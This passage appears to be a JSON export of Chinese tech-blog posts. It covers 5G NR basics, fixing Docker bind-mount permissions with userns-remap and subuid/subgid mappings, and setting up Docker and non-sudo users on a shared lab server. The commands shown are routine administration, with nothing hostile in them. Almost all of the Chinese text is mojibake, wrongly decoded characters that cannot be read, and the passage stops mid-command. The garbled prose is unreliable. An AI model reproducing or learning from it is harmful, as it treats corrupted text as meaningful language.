çº¿ç”µæ ‡å‡†, 5G New Radio; æ–°æ ‡å‡†åº”è¯¥æ”¯æŒä¸ºå°†æ¥ä½¿ç”¨è€Œç¡®å®šçš„éœ€æ±‚ï¼Œå¦‚æ›´é«˜çš„æ•°æ®é€Ÿåº¦ã€æ›´ä½çš„å»¶è¿Ÿã€ç§»åŠ¨æ€§å’Œå¯é æ€§ã€‚5G NRæ˜¯åœ¨RANå’ŒUEä¹‹é—´ä½¿ç”¨ç»è¿‡è®¸å¯çš„ç”µç£é¢‘è°±ä¼ è¾“æ•°æ®çš„æ¥å…¥æœºåˆ¶ã€‚5Gç³»ç»Ÿä¸­çš„NG-RANå¯ä»¥ç”±å¤šä¸ªä¸‹ä¸€ä»£èŠ‚ç‚¹åŸºç«™(gNB)æˆ–å•ä¸ªgNBç»„æˆã€‚NG-RANå°†ä¸ºLTEã€3Gç­‰ä¼ ç»Ÿæ— çº¿æ¥å…¥æŠ€æœ¯æä¾›æ”¯æŒã€‚RANä¸ºç»ˆç«¯æä¾›äº†ä¸æ ¸å¿ƒç½‘ç»œå’Œæ•°æ®ç½‘ç»œäº¤äº’çš„æ¥å£ã€‚5G NRç”±å¤„ç†æ§åˆ¶å¹³é¢çš„ç½‘ç»œåè®®æ ˆå’Œå¤„ç†ç”¨æˆ·å¹³é¢æ¶ˆæ¯çš„ç½‘ç»œåè®®æ ˆç»„æˆï¼Œåˆ†åˆ«å¦‚ä¸‹æ‰€ç¤º UEå’ŒNG-RANä¹‹é—´çš„æ¥å£å«åšUuï¼Œå®ƒåŒæ—¶æ‰¿è½½ç€æ§åˆ¶å¹³é¢å’Œç”¨æˆ·å¹³é¢çš„æµé‡ã€‚ ç¼©å†™åè¯è§£é‡Š","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"æ ‡ç­¾äºŒ","slug":"æ ‡ç­¾äºŒ","permalink":"https://www.sizaif.com/tags/%E6%A0%87%E7%AD%BE%E4%BA%8C/"}],"author":"sizaif"},{"title":"Dockeræ–‡ä»¶å¤¹æ˜ å°„æƒé™é—®é¢˜æ€è€ƒåŠå¯èƒ½è§£å†³æ–¹æ³•","slug":"dockeræ–‡ä»¶å¤¹æ˜ å°„æƒé™é—®é¢˜æ€è€ƒåŠå¯èƒ½è§£å†³æ–¹æ³•","date":"2021-09-23T02:19:50.000Z","updated":"2021-09-23T11:41:25.000Z","comments":true,"path":"posts/39ff9093/","link":"","permalink":"https://www.sizaif.com/posts/39ff9093/","excerpt":"","text":"dockeræ–‡ä»¶å¤¹æ˜ å°„æƒé™é—®é¢˜æ€è€ƒåŠå¯èƒ½è§£å†³æ–¹æ³• èƒŒæ™¯åˆ†æ åœ¨å¤šç”¨æˆ·æœåŠ¡å™¨ä¸Šå…¬ç”¨dockeræ­å»ºç¯å¢ƒæ—¶,åˆæ­¥è®¾æƒ³ä¸ºå®¿ä¸»æœºç”¨æˆ·ä¸ºæ™®é€šç”¨æˆ·,å®¹å™¨å†…ç”¨æˆ·ä¸ºroot, ç”¨æˆ·åœ¨å®¹å™¨å†…è‡ªç”±æ­å»ºè‡ªå·±æ‰€éœ€çš„ç¯å¢ƒ,è€Œä¸å½±å“å…¶ä»–äººä»¥åŠå®¹å™¨å¤–çš„ç¯å¢ƒ. ä½†å½“ç”¨æˆ·åœ¨ä½¿ç”¨dockeræŒ‚è½½ç£ç›˜çš„æ—¶å€™,ç”±äºå®¹å™¨å†…ä½¿ç”¨rootè¿è¡Œç¨‹åºï¼Œä¼šå¯¼è‡´æŒ‚è½½ä¸­äº§ç”Ÿçš„æ–‡ä»¶å±äºroot:rootã€‚è€Œå®¹å™¨å¤–ç”¨æˆ·å¹¶ä¸æ˜¯rootï¼Œä¼šä½¿çš„æ–‡ä»¶å…±äº«ç”šè‡³é˜…è¯»æ—¥å¿—äº§ç”Ÿæƒé™ä¸Šçš„é—®é¢˜,å¯¼è‡´ä¸å¯è¯»æˆ–ä¸å¯å†™ä¹‹ç±»çš„é—®é¢˜ã€‚ æœ¬æ–‡æ—¨åœ¨å®¿ä¸»æœºä½¿ç”¨æ™®é€šç”¨æˆ·,è€Œå®¹å™¨å†…ä»ç„¶ä½¿ç”¨rootç”¨æˆ·,ä¸”ä¸ä¼šäº§ç”Ÿæ–‡ä»¶æƒé™çš„é—®é¢˜. æ¡ˆä¾‹æˆªå›¾: å¯ä»¥çœ‹åˆ°åˆ›å»ºæ˜ å°„çš„ srså’ŒsrsRAN æ–‡ä»¶å¤¹ å› ä¸ºæ˜¯ç”±docker run å‘½ä»¤è‡ªåŠ¨åˆ›å»ºçš„,æƒé™è¢«åŒ–ä¸ºroot æ™®é€šç”¨æˆ·åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰æƒé™!, éœ€æ±‚ å®¹å™¨å¤–ä½¿ç”¨æ™®é€šç”¨æˆ·(æ²¡æœ‰sudoæƒé™ç­‰ç®¡ç†å‘˜æƒé™) å®¹å™¨å†…ä½¿ç”¨å¸¦ç®¡ç†å‘˜æƒé™çš„rootç”¨æˆ· æ–‡ä»¶æŒ‚è½½åŸç† ç®€è€Œè¨€ä¹‹ï¼Œdockerçš„æ–‡ä»¶æŒ‚è½½ä¸­ï¼Œå®¹å™¨å†…å¤–uidä¸gidç›¸åŒã€‚ æœ€ç®€å•çš„æŒ‚è½½ç£ç›˜ï¼Œä¾‹å¦‚ï¼šdocker run -v $PWD:/data bashï¼Œå°±æ˜¯å°†å½“å‰ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…çš„/dataç›®å½•ã€‚æ–‡ä»¶çš„æƒé™å¯ä»¥é€šè¿‡ls -læŸ¥çœ‹ã€‚ å®¹å™¨å†…å¯èƒ½æœ‰ä½¿ç”¨rootç”¨æˆ·å’Œérootç”¨æˆ·è¿è¡Œç¨‹åºçš„ä¸¤ç§æƒ…å†µã€‚ è‹¥å®¹å™¨å†…ä½¿ç”¨rootè¿è¡Œç¨‹åºï¼Œå¯ä»¥æƒ³è±¡ï¼Œäº§ç”Ÿçš„æ–‡ä»¶å±äº0:0ï¼Œä¹Ÿå°±æ˜¯root:rootã€‚å®¹å™¨å¤–æ–‡ä»¶ä¹Ÿä¼šå±äº0:0ï¼ŒåŒæ ·æ˜¯root:rootã€‚è¿™æ ·äº§ç”Ÿçš„æ–‡ä»¶å°±éœ€è¦å®¹å™¨å¤–çš„rootæƒé™æ‰å¯ä»¥æ“ä½œã€‚ è‹¥å®¹å™¨å†…ä½¿ç”¨érootè¿è¡Œç¨‹åºï¼Œä¾‹å¦‚demo:x:1000:1000::/home/blog:/bin/bashï¼Œäº§ç”Ÿçš„æ–‡ä»¶å±äº1000:1000ã€‚å®¹å™¨å¤–æ–‡ä»¶ä¹Ÿä¼šå±äº1000:1000ï¼Œè€Œå®¹å™¨å¤–uidä¸º1000çš„ç”¨æˆ·å¯èƒ½æ˜¯testï¼Œè¿™æ˜¯è‹¥ç¢°å·§ä½ å°±æ˜¯testï¼Œä½ å°±å¯ä»¥é¡ºåˆ©è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚ä½†è‹¥ä½ æ˜¯uidä¸º1001çš„test2ï¼Œè€Œä¸”tæ˜¯ä¸ªtest2è®¨åŒé¬¼ï¼Œä½ å°±å‘Šåˆ«è¿™ä¸ªæ–‡ä»¶äº†ã€‚ç”šè‡³å®¹å™¨å¤–æ ¹æœ¬æ²¡æœ‰uidä¸º1000çš„ç”¨æˆ·ï¼Œé‚£è¿™ä¸ªæ–‡ä»¶å°±ä¸å±äºä»»ä½•äººã€‚ dockerç”¨æˆ·ç»„ dockerç”¨æˆ·ç»„çš„å‡ºç°,ç›®çš„åœ¨äºå½“æ™®é€šç”¨æˆ·æ—¢æ— sudoæƒé™,æœ‰æƒ³è¿è¡Œdockerå‘½ä»¤æ—¶å‡ºç°. ä¸€èˆ¬æ¥è¯´,åœ¨linuxç¯å¢ƒä¸‹å®‰è£…å®Œæˆdocker,ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºid=999çš„dockerç»„ . æ­¤æ—¶åªéœ€è¦å°†æ™®é€šç”¨æˆ·åŠ å…¥åˆ°dockerç»„ä¸­å³å¯. å…·ä½“ dockerç»„çš„id, è¯·è‡ªè¡ŒæŸ¥çœ‹ æ–¹å¼æœ‰ä¸¤ç§(éœ€è¦åœ¨æ‹¥æœ‰sudoæƒé™çš„è´¦å·ä¸‹ä¿®æ”¹): ä½¿ç”¨usermodå‘½ä»¤ $ sudo usermod -aG docker &lt;ç”¨æˆ·å> # e.g sudo usermod -aG docker test1 ç›´æ¥ä¿®æ”¹ /etc/group ä¸­ docker æ‰€åœ¨ç»„ $ sudo vim /etc/group # åœ¨dockeræ‰€åœ¨è¡Œ,æŒ‰æ ¼å¼åœ¨åé¢æ·»åŠ ç”¨æˆ·åå³å¯ ä¿®æ”¹å®Œæˆå,é‡å¯sshæˆ–é‡æ–°ç™»å³å¯, ä½¿ç”¨id &lt;ç”¨æˆ·å&gt; æ£€æŸ¥æ˜¯å¦åœ¨dockeræ‰€åœ¨ç»„ ä¸‰ç§å¯èƒ½è§£å†³æ–¹æ³• 1. é™å®šå¼€å¯ç”¨æˆ· å³è¿è¡Œ docker run -u &lt;xxx&gt;:&lt;xxx&gt; ä½†è¿™ä¸ªæ–¹æ³•æ— æ³•è§£å†³ä¸Šè¿°çš„éœ€æ±‚ 2.ä½¿ç”¨å­ç”¨æˆ· è‹¥å®¹å™¨å†…å¤–æ–‡ä»¶çš„uid:gidå¯ä»¥ä¸åŒï¼Œè¿™ä¸ªé—®é¢˜å°±å¯ä»¥å¾ˆå®¹æ˜“è§£å†³ã€‚çš„ç¡®æœ‰è¿™ä¹ˆä¸€ä¸ªæ–¹æ¡ˆï¼Œè®©å®¹å™¨å†…æ‰€æœ‰çš„uid:gidä»¥ä¸€å®šçš„è§„åˆ™æ˜ å°„ï¼Œæˆ‘æ¨èä½¿ç”¨è¿™ä¸€æ–¹æ¡ˆã€‚æ–‡ç« çš„æ–¹æ¡ˆæ¼”ç¤ºèŠ‚ä¸­æˆ‘ä¼šæ¼”ç¤ºè¿™ä¸€æ–¹æ¡ˆã€‚ åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œè¿™ä¸ªæ–¹æ¡ˆæœ¬èº«æ˜¯ä¸ºäº†è§£å†³å®‰å…¨é—®é¢˜ï¼Œè§è¿™é‡Œã€‚å‘ç”Ÿå®¹å™¨æŒ‚è½½ç£ç›˜rootæƒé™ææƒä¹Ÿä¸æ˜¯ä¸€æ¬¡ä¸¤æ¬¡äº†ï¼Œè¿™ç®—æ˜¯ä¸€ä¸ªå®˜æ–¹çš„è§£å†³æ–¹æ¡ˆã€‚ https://docs.docker.com/engine/security/userns-remap/ ä½†è¿™ä¸ªæ–¹æ¡ˆä¼šæœ‰ä¸€äº›é™åˆ¶ï¼š ä¸å¯ä½¿ç”¨--pid=host æˆ– --network=host ä¸å¯ä½¿ç”¨æ— æ³•è¯†åˆ«æˆ–ä½¿ç”¨ç”¨æˆ·æ˜ å°„çš„æŒ‚è½½ç£ç›˜ è‹¥ä½¿ç”¨docker run --privilegedåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨--userns=host éƒ½æ˜¯ä¸å¤§çš„é™åˆ¶ï¼Œä½¿ç”¨çš„æ—¶å€™ç•™ä¸ªå¿ƒçœ¼å³å¯ã€‚ è§£é‡Š: å› ä¸ºdocker æƒé™æ˜ å°„çš„åŸç†æ˜¯, å®¹å™¨å†…å¤–uidä¸gidç›¸åŒ, é‚£ä¹ˆæˆ‘æ˜¯å¦å¯ä»¥ é€šè¿‡ userns-remap å‘½ä»¤å®ç°, å°†å®¹å™¨å†…çš„root æ˜ å°„åˆ°å®¹å™¨å¤–å®¿ä¸»æœºä¸Šä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜(sudo)çš„ç”¨æˆ·(ç§°ä¸ºsiz)ä¸Šå‘¢,è€Œå…¶ä»–æ™®é€šç”¨æˆ·(test&lt;xxx&gt;)åªéœ€è¦åœ¨è¿™ä¸ªsizæ‰€åœ¨çš„ç»„å³å¯. è€Œè¿™ä¸ªç»„çš„å°ç»„ç®¡ç†å‘˜å³ä¸ºsiz. ä½†æ­¤æ—¶ä¸€ä¸ªæ–°çš„é—®é¢˜å‡ºç°äº†: å½“æ™®é€šç”¨æˆ·åˆ›å»ºæ–‡ä»¶å¤¹æ˜ å°„æ—¶, æ­¤æ–‡ä»¶å¤¹çš„æ‰€å±è€…ä¸ºsiz,ä½†å°ç»„æƒé™ä»…ä¸ºxr å³æ‰€åœ¨ç»„çš„æˆå‘˜æ²¡æœ‰ä¿®æ”¹çš„æƒé™,åªæœ‰è¯»å’Œè¿è¡Œçš„æƒé™, å¹¶ä¸”æ­¤æ—¶æ™®é€šç”¨æˆ·(test&lt;xxx&gt; å¹¶æ²¡æœ‰sudoæƒé™,ä¹Ÿå°±æ— æ³•é€šè¿‡chmod g+w ç­‰å‘½ä»¤æ¥å®ç°ææƒ. æ­¤æ—¶è¯¥å¦‚ä½•è§£å†³å‘¢? ç­”: é€šè¿‡è¿›å…¥å®¹å™¨å†…ææƒå®ç°, â€‹ å› ä¸ºå®¹å™¨å†…çš„ç”¨æˆ·ä¸ºroot,å³å¯¹åº”çš„æƒé™ä¸ºå°ç»„ç®¡ç†å‘˜siz, è€Œå°ç»„ç®¡ç†å‘˜æ‹¥æœ‰(sudo) æƒé™, åˆå› ä¸ºæ–‡ä»¶æ˜ å°„æ˜¯å®¹å™¨å†…å¤–ç›¸åŒçš„, åœ¨å®¹å™¨å†…ä¿®æ”¹äº†æ–‡ä»¶æƒé™, é‚£ä¹ˆåœ¨å®¹å™¨å¤–æ™®é€šç”¨æˆ·å°±æœ‰äº†è¯»å†™æ‰§è¡Œçš„æƒé™. æ“ä½œå®ç° ä¿®æ”¹/etc/subuid ä¸ /etc/subgid æŸ¥çœ‹å°ç»„çš„ç®¡ç†å‘˜id $ id siz uid=1000(siz) gid=1000(siz) groups=1000(siz) # å¾—åˆ° sizçš„id ä¸º 1000 ä½¿ç”¨å¸¦sudoçš„æƒé™è´¦å·ä¿®æ”¹ /etc/subuid ä¸ /etc/subgid æ–‡ä»¶ æ ¼å¼ä¸º: &lt;name>:start:number å¯¹åº”æ–¹å¼: å¦‚æœç»„ç®¡ç†å‘˜id ä¸º1000 , åˆ™å¯¹åº”å®¹å™¨å†…çš„root ä¸º1 , å³&lt;name&gt;:1000:1 å¦‚æœç»„ç®¡ç†å‘˜idä¸º 1003 ,åˆ™å¯¹åº”å®¹å™¨å†…çš„root ä¸º 1+(1003-1000)=4 å³ &lt;name&gt;:1003:4 æ ¹æ®ç»„ç®¡ç†å‘˜id å¯¹åº”è®¾ç½®å¥½æ˜ å°„ ä¾‹å¦‚æœ¬æ–‡ç»„ç®¡ç†å‘˜siz çš„ id ä¸º1000 , åˆ™ä¿®æ”¹ä¸ºå¦‚ä¸‹æ ·å¼, å¹¶ä¿å­˜ä¿®æ”¹ # sudo vim /etc/subuid siz:1000:1 siz:100000:65536 test1:165536:65536 test2:231072:65536 demo:296608:65536 # sudo vim /etc/subgid siz:1000:1 siz:100000:65536 test1:165536:65536 test2:231072:65536 demo:296608:65536 ä¿®æ”¹docker å®ˆæŠ¤ç¨‹åº /etc/docker/daemon.json æ³¨æ„ä¿®æ”¹ /etc/docker/daemon.json æ–‡ä»¶å, ä¼šå¯¼è‡´ä¹‹å‰çš„ é•œåƒä¸å®¹å™¨ä¸è¢«è¯†åˆ«, æ‰€ä»¥è¯·åšå¥½å¤‡ä»½. å®¹å™¨-&gt;æ‰“åŒ…æˆé•œåƒ-&gt; æ¨é€åˆ°hub Enabling userns-remap effectively masks existing image and container layers, as well as other Docker objects within /var/lib/docker/. This is because Docker needs to adjust the ownership of these resources and actually stores them in a subdirectory within /var/lib/docker/. It is best to enable this feature on a new Docker installation rather than an existing one. # æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„åŒ–, è¯·åˆ›å»º # sudo vim /etc/docker/daemon.json &#123; \"userns-remap\":\"&lt;ç»„ç®¡ç†å‘˜åç§°>\" &#125; # sudo service docker restart # æŸ¥çœ‹docker çŠ¶æ€ sudo systemctl status docker.service è¿™é‡Œ `â€œuserns-remapâ€:&quot;&lt;ç»„ç®¡ç†å‘˜åç§°&gt;&quot;çš„æ ¼å¼ å‚è€ƒå®˜æ–¹æ–‡æ¡£ https://docs.docker.com/engine/security/userns-remap/ Edit /etc/docker/daemon.json. Assuming the file was previously empty, the following entry enables userns-remap using user and group called testuser. You can address the user and group by ID or name. You only need to specify the group name or ID if it is different from the user name or ID. If you provide both the user and group name or ID, separate them by a colon (:) character. The following formats all work for the value, assuming the UID and GID of testuser are 1001: testuser testuser:testuser 1001 1001:1001 testuser:1001 1001:testuser ä¿®æ”¹æ™®é€šç”¨æˆ·çš„ç»„ å½“åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‘ç°ä¸€ä¸ªæ–°çš„é—®é¢˜: å³ç»„å†…æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶åœ¨å®¹å™¨ä¸­å› ä¸ºæ²¡æœ‰ç›¸åº”çš„`uid:gid` æ˜ å°„, å¹¶ä¸”å®¹å™¨ä¸­çš„`root`ç”¨æˆ·çš„æƒé™å¾ˆä½æ—¶(ç»„ç®¡ç†å‘˜æ‹¥æœ‰sudoæƒé™,ä½†éœ€è¦è¾“å…¥sudoæ‰å¯ä»¥; è€Œå®¹å™¨ä¸­æ—¶æ²¡æœ‰sudoå‘½ä»¤çš„,æ‰€æœ‰è¯´è¿™é‡Œçš„`root`æƒé™å¾ˆä½)åœ¨è¿™ç§æƒ…å†µä¸‹: å°±ä¼šå‡ºç°æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶,åœ¨å®¹å™¨ä¸­è¢«è¯†åˆ«ä¸º: `nobody ,nogroups ç°è±¡ æš‚æ—¶çš„è§£å†³æ–¹æ³• æ™®é€šç”¨æˆ·åˆ é™¤ç§æœ‰ç»„,å³è®©æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä¸º(dockerå®¹å™¨æ˜ å°„çš„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„)â€‹ ä¾‹å¦‚: æœ¬æ–‡æ¼”ç¤ºå°ç»„ç®¡ç†å‘˜ä¸ºsiz, ç»„åä¸º(siz) åˆ™è®© æ™®é€šç”¨æˆ·test&lt;xxx&gt; çš„ä¸»ç»„ä¸ºsiz# å‘½ä»¤: sudo usermod -g &lt;å°ç»„ç®¡ç†å‘˜åç§°> &lt;æ™®é€šç”¨æˆ·åç§°> # å°†æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä»ç§æœ‰ç»„æ”¹ä¸ºå°ç»„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„ $ sudo usermod -g test1 sizå¯¹å®¿ä¸»æœº(å®¹å™¨å¤–)ç»„æˆå‘˜ä¸­æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¹å™¨å†…rootè·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™$ chmod g+wxr &lt;xxx>å¯¹å®¹å™¨å†…root åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™ç›®çš„: ä½¿å®¿ä¸»æœº(å®¹å™¨å¤–) ç»„æˆå‘˜æ™®é€šç”¨æˆ·è·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹(w) æƒé™$ chmod g+wxr &lt;xxx>ç¼ºé™·:å½“å†…å¤–åˆ›å»ºæ–°çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä½¿, å†…å¤–è¦ä¸æ–­çš„ä½¿ç”¨chmod å‘½ä»¤è¿›è¡Œæˆæƒ, æ¼”ç¤º: ç»„æˆå‘˜ ç»„ç®¡ç†å‘˜(siz) è¿›è¡Œæ˜ å°„æµ‹è¯•: ç»„æˆå‘˜test1 è¿›è¡Œæ˜ å°„æµ‹è¯• ä½¿ç”¨entrypoint.sh å®šåˆ¶è„šæœ¬ è¿™ä¸ªè¿‡ç¨‹æ˜¯åœ¨ç¼–å†™Dockerfileæ–‡ä»¶æ—¶ä½¿ç”¨çš„, ç›®çš„æ˜¯è®©å®¹å™¨å†…å¤–å¯¹åº”çš„ç”¨æˆ·ç›¸ç­‰æ¥è§£å†³æ–‡ä»¶å¤¹æ˜ å°„ç›®å½•æƒé™çš„é—®é¢˜. ä¸»è¦çš„æ€è·¯æ˜¯,ä»ä¸»æœºä¸­è¯»å–å½“å‰ç”¨æˆ·çš„id, ç„¶åå†åˆ›å»ºå®¹å™¨æ—¶ç›¸åº”çš„åœ¨å®¹å™¨å†…éƒ¨æ–°å»ºä¸€ä¸ªå¯¹åº”çš„ç”¨æˆ·, è¿™æ ·ä¿è¯äº†å®¹å™¨å†…å¤–çš„uid:gid ç›¸ç­‰. ä½†åœ¨è¿™ä¸ªé‡Œä¸ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚, æ•…ä¸è®¨è®º. æ€»ç»“ ä¸ºäº†è§£å†³è®©å®¿ä¸»æœºä½¿ç”¨æ™®é€šç”¨æˆ·æ¥ä½¿ç”¨docker,è€Œåœ¨å®¹å™¨ä¸­ç›¸å¯¹ç»™ä¸è¾ƒé«˜çš„root æƒé™ç”¨æˆ·éœ€æ±‚. æœ¬æ–‡é‡‡ç”¨äº†ä¿®æ”¹dockerå®ˆæŠ¤ç¨‹åºçš„æ–¹æ³•,å…¶å®˜æ–¹æ–‡ä»¶æœ¬æ„æ˜¯dockerä¸ºäº†è§£å†³å®¹å™¨å†…rootå‡æƒçš„é—®é¢˜ æ‰€è°“å‡æƒ, å³ä¸åšä»»ä½•ä¿®æ”¹æƒ…å†µä¸‹, å®¹å™¨å†…root ä¸å®¿ä¸»æœºrootç›¸å¯¹åº”, è™½ç„¶è¿™ä¸ªå®¹å™¨å†…çš„æƒé™æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„root æƒé™, ä½†å¯ä»¥é€šè¿‡æ˜ å°„å®¿ä¸»æœºæ ¹ç›®å½•,å°†æ‰€æœ‰å†…å®¹æ˜ å°„åˆ°å®¹å™¨ä¸­, å®ç°åœ¨å®¹å™¨ä¸­è·å¾—æ‰€æœ‰æ–‡ä»¶çš„æƒé™,æ¥å®ç°æ¶æ„æ”»å‡». é€šè¿‡æ˜ å°„ç”¨æˆ·, å®¹å™¨ä¸­çš„root æƒé™ä¸å®¿ä¸»æœºè¢«æ˜ å°„çš„ç”¨æˆ·æƒé™ç›¸ç­‰, å¯ä»¥æ€è€ƒè¿™æ ·ä¸€ä¸ªé—®é¢˜: å¦‚æœæˆ‘æ˜ å°„çš„å®¿ä¸»æœºç”¨æˆ·æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·(æ²¡æœ‰sudo)æƒé™,é‚£ä¹ˆå®¹å™¨é‡Œçš„root æœ‰æ²¡æœ‰sudoæƒé™å‘¢? ç­”æ¡ˆ ç­”æ¡ˆæ˜¯æ²¡æœ‰çš„, å¯ä»¥å°è¯•ä¸€ä¸‹. å®¹å™¨çš„çš„root ä»…ä»…æ˜¯ä¸ªåç§°, å®ƒå¯ä»¥å«åšsuperhero ä¹Ÿå¯ä»¥å«åš tom , åªæ˜¯ä¸ªåå­—,å¹¶æ— æ‰€è°“,çœŸæ­£ç›¸å…³çš„æ˜¯uid:gid","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"å®éªŒå®¤æœåŠ¡å™¨ç”¨æˆ·åˆ†çº§ç®¡ç†+Dockerå¤šç¯å¢ƒè¿è¡Œè®¾æƒ³","slug":"å®éªŒå®¤æœåŠ¡å™¨ç”¨æˆ·åˆ†çº§ç®¡ç†-dockerå¤šç¯å¢ƒè¿è¡Œè®¾æƒ³","date":"2021-09-10T14:39:54.000Z","updated":"2021-09-20T00:45:22.574Z","comments":true,"path":"posts/55127002/","link":"","permalink":"https://www.sizaif.com/posts/55127002/","excerpt":"","text":"[TOC] ç”¨æˆ·åˆ†çº§ç®¡ç† åˆæ­¥è®¾æƒ³: root ç”¨æˆ·ä¸ºè¶…çº§ç®¡ç†å‘˜, ç®¡ç†å‘˜-A æ‹¥æœ‰ç®¡ç†æƒé™,è´Ÿè´£ç»´æŠ¤. æ™®é€šç¾¤ç»„æ— è¶…çº§ç®¡ç†å‘˜æƒé™, ä½†æ‹¥æœ‰å¯¹dockeré•œåƒå®¹å™¨çš„åˆ›å»ºä¿®æ”¹åˆ å‡å¯åŠ¨ç­‰æƒé™. æ™®é€šç”¨æˆ·ä»dockerhubä¸­æ‹‰å–é•œåƒ,åˆ›å»ºå®¹å™¨ç¯å¢ƒ è·³è½¬ dockerä½¿ç”¨æ‰‹å†Œv1 æ­¥éª¤ å®‰è£…Docker æŸ¥çœ‹ç‰ˆæœ¬ $ cat /proc/version $ uname -a $ lsb_release -a $ cat /etc/issue å¯¹ç—‡ä¸‹è¯ ubuntu å‚è€ƒæ–‡æ¡£ https://docs.docker.com/engine/install/ubuntu/ ä½¿ç”¨è¿œç¨‹ä»“åº“å®‰è£… Install using the repository Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker repository. Afterward, you can install and update Docker from the repository. Update the apt package index and install packages to allow apt to use a repository over HTTPS $ sudo apt-get update # å¿…è¦è½¯ä»¶ $ sudo apt-get install apt-transport-https ca-certificates curl gnupg lsb-release Add Dockerâ€™s official GPG key: $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg Use the following command to set up the stable repository. To add the nightly or test repository, add the word nightly or test (or both) after the word stable in the commands below. Learn about nightly and test channels. â€‹ Note: The lsb_release -cs sub-command below returns the name of your Ubuntu distribution, such as xenial. Sometimes, in a distribution like Linux Mint, you might need to change $(lsb_release -cs) to your parent Ubuntu distribution. For example, if you are using Linux Mint Tessa, you could use bionic. Docker does not offer any guarantees on untested and unsupported Ubuntu distributions. x86_64 / amd64armhfarm64s390x$ echo \\ \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null$ echo \\ \"deb [arch=armhf signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null$ echo \\ \"deb [arch=arm64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null$ echo \\ \"deb [arch=s390x signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null Install Docker Engine Update the apt package index, and install the latest version of Docker Engine and containerd, or go to the next step to install a specific version: $ sudo apt-get update $ sudo apt-get install docker-ce docker-ce-cli containerd.io Got multiple Docker repositories? If you have multiple Docker repositories enabled, installing or updating without specifying a version in the apt-get install or apt-get update command always installs the highest possible version, which may not be appropriate for your stability needs. Upgrade Docker Engine To upgrade Docker Engine, first run sudo apt-get update, then follow the installation instructions, choosing the new version you want to install. æ·»åŠ æµ‹è¯•ç”¨æˆ· $ sudo adduser test1 Adding user `test1' ... Adding new group `test1' (1001) ... Adding new user `test1' (1001) with group `test1' ... Creating home directory `/home/test1' ... Copying files from `/etc/skel' ... New password: Retype new password: passwd: password updated successfully Changing the user information for test1 Enter the new value, or press ENTER for the default Full Name []: Room Number []: Work Phone []: Home Phone []: Other []: Is the information correct? [Y/n] y $ sudo adduser test2 Adding user `test2' ... Adding new group `test2' (1002) ... Adding new user `test2' (1002) with group `test2' ... Creating home directory `/home/test2' ... Copying files from `/etc/skel' ... New password: Retype new password: passwd: password updated successfully Changing the user information for test2 Enter the new value, or press ENTER for the default Full Name []: Room Number []: Work Phone []: Home Phone []: Other []: Is the information correct? [Y/n] y siz@ubuntu:/etc/apt$ æŸ¥çœ‹test1,test2 ç”¨æˆ· $ id test1 # uid=1001(test1) gid=1001(test1) groups=1001(test1) $ id test2 # uid=1002(test2) gid=1002(test2) groups=1002(test2) # å¯ä»¥å‘ç° test1 test2 æ²¡æœ‰sudo ç­‰æƒé™,ä¸º æ™®é€šç”¨æˆ· æˆäºˆdockeræƒé™ å°†test1,test2 æ™®é€šç”¨æˆ· æ·»åŠ åˆ°dockerç»„ä¸­ $ sudo usermod -aG docker test1 $ sudo usermod -aG 